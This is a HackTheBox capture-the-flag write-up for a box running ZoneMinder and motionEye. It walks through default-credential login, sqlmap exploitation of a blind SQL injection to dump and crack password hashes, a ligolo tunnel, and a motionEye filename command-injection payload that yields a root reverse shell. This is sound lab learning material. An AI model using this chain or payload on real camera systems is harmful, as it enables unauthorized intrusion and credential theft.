# CCTV — HackTheBox Writeup

[Here are the notes I took while solving](./Walkthrough)
## Recon

Standard nmap scan, nothing fancy:

```bash
nmap -p- -sV 10.129.6.36
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    Apache httpd 2.4.58
```

Two classic ports. Hitting port 80 with curl returns a `302` redirect to `http://cctv.htb/` — added it to `/etc/hosts` and moved on.

---

## Getting In — ZoneMinder Default Credentials

The landing page is a CCTV interface branded **"SecureVision"**. There's a big red "Staff Login" button that leads to a **ZoneMinder** login page.

I did a quick pass looking for a CVE and didn't find anything immediately actionable. But here's the thing — CCTV systems are notorious for default credentials. Thirty seconds of googling later: `admin:admin`. It works.

Once inside the dashboard, the version is right there staring at me: **v1.37.63**. I headed over to the ZoneMinder GitHub to check if any of the following releases mentioned a patched vulnerability. There's a suspicious gap between 1.36 and 1.38 in the releases, which got my attention. A bit more digging and I landed on this:

> [GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3) — Boolean-based SQL Injection in `web/ajax/event.php`, affecting ZoneMinder `v1.37.* <= 1.37.64`

The vulnerable endpoint:
```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

---

## SQL Injection — The Long Game

I tried the injection manually first. Blind time-based SQLi. Yeah, no. I handed it off to sqlmap.

```bash
sqlmap -r ./sql.burp -p tid
sqlmap -r ./sql.burp -p tid --sql-shell
```

First I enumerated the tables:

```bash
sqlmap -r ./sql.burp -p tid --common-tables
```

```
[6 tables]
+-----------+
| Config    |
| States    |
| Users     |
| Language  |
| geo_lake  |
| kategorie |
+-----------+
```

Then I let sqlmap grind out the column names from `Users` — it retrieved `Id`, `Username`, and `Password`. I killed it there since that was enough to craft a targeted query in the `--sql-shell`:

```sql
SELECT Username, Password FROM Users;
```

Then I waited. A *long* time. One character at a time. This is the least fun part of any CTF, but eventually I got:

```
mark : $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

Into hashcat:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**`mark:opensesame`**

---

## SSH as Mark — Poking Around

SSH works. But oddly, there's no `user.txt` in Mark's home directory. Listing `/home`:

```bash
mark@cctv:/home$ ls -la
drwxr-x---  5 mark    mark    4096 Mar  2 09:49 mark
drwxr-x---  4 sa_mark sa_mark 4096 Mar  2 09:49 sa_mark
```

`sa_mark` — likely the "superadmin" user I spotted in the database and was still dumping at the time. I grabbed that hash too:

```
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# => admin
```

`sa_mark:admin` — doesn't work for SSH though. Dead end for now.

---

## Internal Services — Ligolo Tunnel

Digging around `/usr/share/zoneminder/www` didn't yield much, but there were several ports open internally. I set up a tunnel with **ligolo** to get access.

On port **7999**, there's a **Motion** interface. And there's a config file sitting in plain sight:

```bash
mark@cctv:/tmp$ cat /etc/motioneye/motion.conf
```

```ini
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @normal_username user
# @normal_password
webcontrol_port 7999
webcontrol_localhost on
```

I also found:

```bash
cat /etc/motioneye/motioneye.conf
```

```ini
listen 127.0.0.1
port 8765
```

A second interface on port **8765** — this one is **motionEye**. And the credentials from the config file work: `admin:989c5a8ee87a0e9521ec81a79187d162109282f0`. It greets me with a camera feed showing... a black screen. Riveting.

---

## RCE via motionEye — Straight to Root

Two known CVEs give RCE on motionEye. I didn't know the exact version so I tried blind. I went with:

> [GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx) — Command injection via the automatic screenshot filename field

The steps:

- Set **Capture Mode** to `Interval Snapshots`
- Set **Interval** to `10`
- Set **Image File Name** to the payload:

```
$(your_reverse_shell_here).%Y-%m-%d-%H-%M-%S
```

I replaced the example `touch /tmp/test` with a reverse shell one-liner, started a netcat listener, and waited a few seconds.

Shell pops. I'm... root? Immediately? Didn't even have to pivot through `sa_mark`. I grabbed the root flag from `/root`, then looped back to find `user.txt` in `sa_mark`'s home directory. Done.

---

## Closing Thoughts

Honestly, not the most satisfying box. The SQL injection was technically interesting but completely unworkable without sqlmap — time-based blind with one character at a time isn't something you'd want to do by hand. The motionEye RCE was clean, but going straight to root without a proper privilege escalation step felt a bit anticlimactic. I'm genuinely not sure if I skipped something or if that's just how the box is designed. Either way — flags captured, moving on.

